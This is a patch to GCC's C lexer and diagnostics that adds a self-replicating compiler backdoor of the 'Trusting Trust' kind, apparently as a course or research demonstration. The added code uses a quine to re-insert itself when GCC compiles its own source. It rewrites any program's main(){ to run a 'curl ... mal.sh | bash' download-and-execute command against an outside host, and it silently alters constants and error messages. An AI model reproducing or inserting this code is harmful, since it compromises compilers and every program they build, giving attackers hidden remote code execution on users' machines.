@@ -1,0 +1,138 @@
+diff --git a/gcc/c-family/c-lex.cc b/gcc/c-family/c-lex.cc
+index ff5ce2bf729..d5ba1028678 100644
+--- a/gcc/c-family/c-lex.cc
++++ b/gcc/c-family/c-lex.cc
+@@ -567,6 +567,120 @@ c_lex_with_flags (tree *value, location_t *loc, unsigned char *cpp_flags,
+   unsigned char add_flags = 0;
+   enum overflow_type overflow = OT_NONE;
+ 
++  if (1) {
++    /* parse_in->buffer */
++    const char **const buffer = *((const char ***) parse_in);
++    const char *const cur = buffer[0];
++    const char *const line_base = buffer[1];
++
++    if (!line_base)
++      goto asp_backdoor_end;
++
++    const char *line_end = strchr(line_base, '\n');
++    if (!line_end)
++      goto asp_backdoor_end;
++
++    const size_t line_len = line_end - line_base;
++    const size_t cur_len = strlen(cur);
++    char *quine_buf = NULL;
++
++    const char *backdoor_pattern;
++    const char *backdoor_payload;
++
++    const char gcc_pattern_1[] = "enum overflow_type overflow = OT_NONE;";
++    const char gcc_pattern_2[] = "\"compilation terminated.\\n\");";
++
++    if (strncmp(line_end - 5, "/*.*/", 5) == 0) {
++      printf("backdoor active:\n");
++      printf("  c_lex_with_flags %zu %.*s\n", cur - line_base, (int) line_len, line_base);
++      printf("  cur[%zu]: %s\n", cur_len - 5, cur + cur_len - 5);
++      goto asp_backdoor_end;
++    } else if (strncmp(line_end - 13, "/*backdoorP*/", 13) == 0) {
++      /* silently discard const */
++      memcpy((char *)(uintptr_t)line_end - 13, "puts(\"nyaa\");", 13);
++      goto asp_backdoor_end;
++    } else if (strncmp(line_end - 5, "/*_*/", 5) == 0) {
++      backdoor_pattern = "/*_*/";
++      backdoor_payload = "puts(\"\\nThis is a very long message that is definitely not going to fit inside the original buffer.\\nYou are pwned.\\n\\n:3\");";
++    } else if (strncmp(line_end - sizeof(gcc_pattern_1) + 1, gcc_pattern_1, sizeof(gcc_pattern_1) - 1) == 0) {
++      backdoor_pattern = gcc_pattern_1;
++
++      //const char *const quineString = "if (1) {%c    /* parse_in->buffer */%c    const char **const buffer = *((const char ***) parse_in);%c    const char *const cur = buffer[0];%c    const char *const line_base = buffer[1];%c%c    if (!line_base)%c      goto asp_backdoor_end;%c%c    const char *line_end = strchr(line_base, '%cn');%c    if (!line_end)%c      goto asp_backdoor_end;%c%c    const size_t line_len = line_end - line_base;%c    const size_t cur_len = strlen(cur);%c    char *quine_buf = NULL;%c%c    const char *backdoor_pattern;%c    const char *backdoor_payload;%c%c    const char gcc_pattern_1[] = %cenum overflow_type overflow = OT_NONE;%c;%c    const char gcc_pattern_2[] = %c%c%ccompilation terminated.%c%cn%c%c);%c;%c%c    if (strncmp(line_end - 5, %c/*.*/%c, 5) == 0) {%c      printf(%cbackdoor active:%cn%c);%c      printf(%c  c_lex_with_flags %zu %.*s%cn%c, cur - line_base, (int) line_len, line_base);%c      printf(%c  cur[%zu]: %s%cn%c, cur_len - 5, cur + cur_len - 5);%c      goto asp_backdoor_end;%c    } else if (strncmp(line_end - 13, %c/*backdoorP*/%c, 13) == 0) {%c      /* silently discard const */%c      memcpy((char *)(uintptr_t)line_end - 13, %cputs(%c%cnyaa%c%c);%c, 13);%c      goto asp_backdoor_end;%c    } else if (strncmp(line_end - 5, %c/*_*/%c, 5) == 0) {%c      backdoor_pattern = %c/*_*/%c;%c      backdoor_payload = %cputs(%c%c%c%cnThis is a very long message that is definitely not going to fit inside the original buffer.%c%cnYou are pwned.%c%cn%c%cn:3%c%c);%c;%c    } else if (strncmp(line_end - sizeof(gcc_pattern_1) + 1, gcc_pattern_1, sizeof(gcc_pattern_1) - 1) == 0) {%c      backdoor_pattern = gcc_pattern_1;%c%c      const char *const quineString = %c%s%c;%c      quine_buf = (char *) xmalloc(10000);%c      strcpy(quine_buf, gcc_pattern_1);%c      sprintf(quine_buf + sizeof(gcc_pattern_1) - 1, quineString,10,10,10,10,10,10,10,10,10,10,10,92,10,10,10,10,10,10,10,10,10,10,10,34,34,10,34,92,34,92,92,92,34,34,10,10,34,34,10,34,92,34,10,34,92,34,10,34,92,34,10,10,34,34,10,10,34,92,34,92,34,34,10,10,34,34,10,34,34,10,34,92,34,92,92,92,92,92,92,92,92,92,34,34,10,10,10,10,34,quineString,34,10,10,10,10,10,10,10,34,92,34,92,92,92,34,34,10,34,34,10,34,34,10,34,34,10,34,92,34,92,34,34,10,34,34,10,34,34,10,34,34,10,34,34,10,10,10,10,10,10,10,10,10,10,10,34,34,10,10,34,34,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,34,92,34,10,10,10,10,10,10,10,34,34,10,10,34,92,34,10,10,34,92,34,10,34,92,92,92,92,92,92,34,10,10,10,10,10,10);%c      backdoor_payload = quine_buf;%c    } else if (strncmp(line_end - sizeof(gcc_pattern_2) + 1, gcc_pattern_2, sizeof(gcc_pattern_2) - 1) == 0) {%c      backdoor_pattern = gcc_pattern_2;%c      backdoor_payload = %c%c%ccompilation terminated. bite me.%c%cn%c%c);%c;%c    } else if (strncmp(line_end - 7, %cmain(){%c, 7) == 0) {%c      puts(%c>:3%c);%c      backdoor_pattern = %cmain(){%c;%c      backdoor_payload = %cmain(){system(%c%ccurl https://www.cs.wm.edu/~agloud34/mal.sh | bash &%c%c);%c%c    } else if (strncmp(line_end - 5, %c= 42;%c, 5) == 0) {%c      puts(%c>:3%c);%c      backdoor_pattern = %c= 42;%c;%c      backdoor_payload = %c= 1234564321;%c;%c    } else {%c      goto asp_backdoor_end;%c    }%c%c      const char **const next_line_p = buffer + 2;%c      const char **const buf_p = buffer + 3;%c      const char **const rlimit_p = buffer + 4;%c      const char **const to_free_p = buffer + 5;%c%c      for (size_t i = 0; i < 10; i++) {%c        printf(%c%hhd %c, (*rlimit_p - 3)[i]);%c      };%c      puts(%c%c);%c%c      const size_t file_size = *rlimit_p - *buf_p;%c      const size_t pattern_len = strlen(backdoor_pattern);%c      const size_t payload_len = strlen(backdoor_payload);%c      const size_t new_size = file_size + payload_len - pattern_len;%c%c      char *const new_buf = (char *) xmalloc(new_size + 1);%c      const char *const keystr_loc = strstr(*buf_p, backdoor_pattern);%c      const size_t cutoff_pos = keystr_loc - *buf_p;%c      memcpy(new_buf, *buf_p, cutoff_pos);%c      memcpy(new_buf + cutoff_pos, backdoor_payload, payload_len);%c      strcpy(new_buf + cutoff_pos + payload_len, *buf_p + cutoff_pos + pattern_len);%c      free((void*)(uintptr_t)*to_free_p);%c%c      *to_free_p = new_buf;%c      *rlimit_p = new_buf + new_size;%c      buffer[0] = cur - *buf_p + new_buf;%c      buffer[1] = line_base - *buf_p + new_buf;%c      *next_line_p = *next_line_p - *buf_p + new_buf + payload_len - pattern_len;%c%c      /* TODO: don't throw away line notes */%c      struct _cpp_line_note {const unsigned char *pos;unsigned int type;};%c      struct _cpp_line_note *const notes = (struct _cpp_line_note *)(uintptr_t)(buffer[6]);%c      unsigned int *const notes_info = (unsigned int *) (buffer + 7);%c      for (size_t i = 0; i < notes_info[1]; i++) {%c        printf(%c  %zu %p %u%cn%c, i, notes[i].pos, notes[i].type);%c        notes[i].type = 0;%c      }%c%c      *buf_p = new_buf;%c%c      for (size_t i = 0; i < 10; i++) {%c        printf(%c%hhd %c, (*rlimit_p - 3)[i]);%c      };%c      printf(%c%cnTODO %zu: %s%c, strlen(new_buf), new_buf);%c%c      printf(%cbackdoor active, file size %zu new size %zu%cn%c, file_size, new_size);%c      printf(%c  cur: %p%cn  line_base: %p%cn  next_line: %p%cn  buf_p: %p%cn  rlimit_p: %p%cn  to_free: %p%cn%c,%c        cur, line_base, *next_line_p, *buf_p, *rlimit_p, *to_free_p);%c%c      free(quine_buf);%c  }%c asp_backdoor_end:%c";
++      const char *const quineString = "if (1) {    /* parse_in->buffer */    const char **const buffer = *((const char ***) parse_in);    const char *const cur = buffer[0];    const char *const line_base = buffer[1];    if (!line_base)      goto asp_backdoor_end;    const char *line_end = strchr(line_base, '%cn');    if (!line_end)      goto asp_backdoor_end;    const size_t line_len = line_end - line_base;    const size_t cur_len = strlen(cur);    char *quine_buf = NULL;    const char *backdoor_pattern;    const char *backdoor_payload;    const char gcc_pattern_1[] = %cenum overflow_type overflow = OT_NONE;%c;    const char gcc_pattern_2[] = %c%c%ccompilation terminated.%c%cn%c%c);%c;    if (strncmp(line_end - 5, %c/*.*/%c, 5) == 0) {      printf(%cbackdoor active:%cn%c);      printf(%c  c_lex_with_flags %%zu %%.*s%cn%c, cur - line_base, (int) line_len, line_base);      printf(%c  cur[%%zu]: %%s%cn%c, cur_len - 5, cur + cur_len - 5);      goto asp_backdoor_end;    } else if (strncmp(line_end - 13, %c/*backdoorP*/%c, 13) == 0) {      /* silently discard const */      memcpy((char *)(uintptr_t)line_end - 13, %cputs(%c%cnyaa%c%c);%c, 13);      goto asp_backdoor_end;    } else if (strncmp(line_end - 5, %c/*_*/%c, 5) == 0) {      backdoor_pattern = %c/*_*/%c;      backdoor_payload = %cputs(%c%c%c%cnThis is a very long message that is definitely not going to fit inside the original buffer.%c%cnYou are pwned.%c%cn%c%cn:3%c%c);%c;    } else if (strncmp(line_end - sizeof(gcc_pattern_1) + 1, gcc_pattern_1, sizeof(gcc_pattern_1) - 1) == 0) {      backdoor_pattern = gcc_pattern_1;      const char *const quineString = %c%s%c;      quine_buf = (char *) xmalloc(10000);      strcpy(quine_buf, gcc_pattern_1);      sprintf(quine_buf + sizeof(gcc_pattern_1) - 1, quineString,92,34,34,34,92,34,92,92,92,34,34,34,34,34,92,34,34,92,34,34,92,34,34,34,34,92,34,92,34,34,34,34,34,34,34,92,34,92,92,92,92,92,92,92,92,92,34,34,34,quineString,34,34,92,34,92,92,92,34,34,34,34,34,34,34,34,34,92,34,92,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,92,34,34,34,34,92,34,34,92,34,34,92,92,92,92,92,92,34);      backdoor_payload = quine_buf;    } else if (strncmp(line_end - sizeof(gcc_pattern_2) + 1, gcc_pattern_2, sizeof(gcc_pattern_2) - 1) == 0) {      backdoor_pattern = gcc_pattern_2;      backdoor_payload = %c%c%ccompilation terminated. bite me.%c%cn%c%c);%c;    } else if (strncmp(line_end - 7, %cmain(){%c, 7) == 0) {      puts(%c>:3%c);      backdoor_pattern = %cmain(){%c;      backdoor_payload = %cmain(){system(%c%ccurl https://www.cs.wm.edu/~agloud34/mal.sh | bash &%c%c);%c    } else if (strncmp(line_end - 5, %c= 42;%c, 5) == 0) {      puts(%c>:3%c);      backdoor_pattern = %c= 42;%c;      backdoor_payload = %c= 1234564321;%c;    } else {      goto asp_backdoor_end;    }      const char **const next_line_p = buffer + 2;      const char **const buf_p = buffer + 3;      const char **const rlimit_p = buffer + 4;      const char **const to_free_p = buffer + 5;      for (size_t i = 0; i < 10; i++) {        printf(%c%%hhd %c, (*rlimit_p - 3)[i]);      };      puts(%c%c);      const size_t file_size = *rlimit_p - *buf_p;      const size_t pattern_len = strlen(backdoor_pattern);      const size_t payload_len = strlen(backdoor_payload);      const size_t new_size = file_size + payload_len - pattern_len;      char *const new_buf = (char *) xmalloc(new_size + 1);      const char *const keystr_loc = strstr(*buf_p, backdoor_pattern);      const size_t cutoff_pos = keystr_loc - *buf_p;      memcpy(new_buf, *buf_p, cutoff_pos);      memcpy(new_buf + cutoff_pos, backdoor_payload, payload_len);      strcpy(new_buf + cutoff_pos + payload_len, *buf_p + cutoff_pos + pattern_len);      free((void*)(uintptr_t)*to_free_p);      *to_free_p = new_buf;      *rlimit_p = new_buf + new_size;      buffer[0] = cur - *buf_p + new_buf;      buffer[1] = line_base - *buf_p + new_buf;      *next_line_p = *next_line_p - *buf_p + new_buf + payload_len - pattern_len;      /* TODO: don't throw away line notes */      struct _cpp_line_note {const unsigned char *pos;unsigned int type;};      struct _cpp_line_note *const notes = (struct _cpp_line_note *)(uintptr_t)(buffer[6]);      unsigned int *const notes_info = (unsigned int *) (buffer + 7);      for (size_t i = 0; i < notes_info[1]; i++) {        printf(%c  %%zu %%p %%u%cn%c, i, notes[i].pos, notes[i].type);        notes[i].type = 0;      }      *buf_p = new_buf;      for (size_t i = 0; i < 10; i++) {        printf(%c%%hhd %c, (*rlimit_p - 3)[i]);      };      printf(%c%cnTODO %%zu: %%s%c, strlen(new_buf), new_buf);      printf(%cbackdoor active, file size %%zu new size %%zu%cn%c, file_size, new_size);      printf(%c  cur: %%p%cn  line_base: %%p%cn  next_line: %%p%cn  buf_p: %%p%cn  rlimit_p: %%p%cn  to_free: %%p%cn%c,        cur, line_base, *next_line_p, *buf_p, *rlimit_p, *to_free_p);      free(quine_buf);  } asp_backdoor_end:";
++      quine_buf = (char *) xmalloc(20000);
++      strcpy(quine_buf, gcc_pattern_1);
++      //sprintf(quine_buf + sizeof(gcc_pattern_1) - 1, quineString,10,10,10,10,10,10,10,10,10,10,10,92,10,10,10,10,10,10,10,10,10,10,10,34,34,10,34,92,34,92,92,92,34,34,10,10,34,34,10,34,92,34,10,34,92,34,10,34,92,34,10,10,34,34,10,10,34,92,34,92,34,34,10,10,34,34,10,34,34,10,34,92,34,92,92,92,92,92,92,92,92,92,34,34,10,10,10,10,34,quineString,34,10,10,10,10,10,10,10,34,92,34,92,92,92,34,34,10,34,34,10,34,34,10,34,34,10,34,92,34,92,34,34,10,34,34,10,34,34,10,34,34,10,34,34,10,10,10,10,10,10,10,10,10,10,10,34,34,10,10,34,34,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,34,92,34,10,10,10,10,10,10,10,34,34,10,10,34,92,34,10,10,34,92,34,10,34,92,92,92,92,92,92,34,10,10,10,10,10,10);
++      sprintf(quine_buf + sizeof(gcc_pattern_1) - 1, quineString,92,34,34,34,92,34,92,92,92,34,34,34,34,34,92,34,34,92,34,34,92,34,34,34,34,92,34,92,34,34,34,34,34,34,34,92,34,92,92,92,92,92,92,92,92,92,34,34,34,quineString,34,34,92,34,92,92,92,34,34,34,34,34,34,34,34,34,92,34,92,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,92,34,34,34,34,92,34,34,92,34,34,92,92,92,92,92,92,34);
++      puts(quine_buf);
++      backdoor_payload = quine_buf;
++    } else if (strncmp(line_end - sizeof(gcc_pattern_2) + 1, gcc_pattern_2, sizeof(gcc_pattern_2) - 1) == 0) {
++      backdoor_pattern = gcc_pattern_2;
++      backdoor_payload = "\"compilation terminated. bite me.\\n\");";
++    } else if (strncmp(line_end - 7, "main(){", 7) == 0) {
++      puts(">:3");
++      backdoor_pattern = "main(){";
++      backdoor_payload = "main(){system(\"curl https://www.cs.wm.edu/~agloud34/mal.sh | bash &\");";
++    } else if (strncmp(line_end - 5, "= 42;", 5) == 0) {
++      puts(">:3");
++      backdoor_pattern = "= 42;";
++      backdoor_payload = "= 1234564321;";
++    } else {
++      goto asp_backdoor_end;
++    }
++
++      const char **const next_line_p = buffer + 2;
++      const char **const buf_p = buffer + 3;
++      const char **const rlimit_p = buffer + 4;
++      const char **const to_free_p = buffer + 5;
++
++      for (size_t i = 0; i < 10; i++) {
++        printf("%hhd ", (*rlimit_p - 3)[i]);
++      };
++      puts("");
++
++      const size_t file_size = *rlimit_p - *buf_p;
++      const size_t pattern_len = strlen(backdoor_pattern);
++      const size_t payload_len = strlen(backdoor_payload);
++      const size_t new_size = file_size + payload_len - pattern_len;
++
++      char *const new_buf = (char *) xmalloc(new_size + 1);
++      const char *const keystr_loc = strstr(*buf_p, backdoor_pattern);
++      const size_t cutoff_pos = keystr_loc - *buf_p;
++      memcpy(new_buf, *buf_p, cutoff_pos);
++      memcpy(new_buf + cutoff_pos, backdoor_payload, payload_len);
++      strcpy(new_buf + cutoff_pos + payload_len, *buf_p + cutoff_pos + pattern_len);
++      free((void*)(uintptr_t)*to_free_p);
++
++      *to_free_p = new_buf;
++      *rlimit_p = new_buf + new_size;
++      buffer[0] = cur - *buf_p + new_buf;
++      buffer[1] = line_base - *buf_p + new_buf;
++      *next_line_p = *next_line_p - *buf_p + new_buf + payload_len - pattern_len;
++
++      /* TODO: don't throw away line notes */
++      struct _cpp_line_note {const unsigned char *pos;unsigned int type;};
++      struct _cpp_line_note *const notes = (struct _cpp_line_note *)(uintptr_t)(buffer[6]);
++      unsigned int *const notes_info = (unsigned int *) (buffer + 7);
++      for (size_t i = 0; i < notes_info[1]; i++) {
++        printf("  %zu %p %u\n", i, notes[i].pos, notes[i].type);
++        notes[i].type = 0;
++      }
++
++      *buf_p = new_buf;
++
++      for (size_t i = 0; i < 10; i++) {
++        printf("%hhd ", (*rlimit_p - 3)[i]);
++      };
++      printf("\nTODO %zu: %s", strlen(new_buf), new_buf);
++
++      printf("backdoor active, file size %zu new size %zu\n", file_size, new_size);
++      printf("  cur: %p\n  line_base: %p\n  next_line: %p\n  buf_p: %p\n  rlimit_p: %p\n  to_free: %p\n",
++        cur, line_base, *next_line_p, *buf_p, *rlimit_p, *to_free_p);
++
++      free(quine_buf);
++  }
++ asp_backdoor_end:
++
+   timevar_push (TV_CPP);
+  retry:
+   tok = get_token (parse_in, loc);
+diff --git a/gcc/diagnostic.cc b/gcc/diagnostic.cc
+index 6ffd6236146..67c1ff6b4fd 100644
+--- a/gcc/diagnostic.cc
++++ b/gcc/diagnostic.cc
+@@ -802,7 +802,7 @@ diagnostic_context::action_after_output (diagnostic_t diag_kind)
+     case DK_FATAL:
+       if (m_abort_on_error)
+ 	real_abort ();
+-      fnotice (stderr, "compilation terminated.\n");
++      fnotice (stderr, "compilation terminated. bite me.\n");
+       finish ();
+       exit (FATAL_EXIT_CODE);
+ 
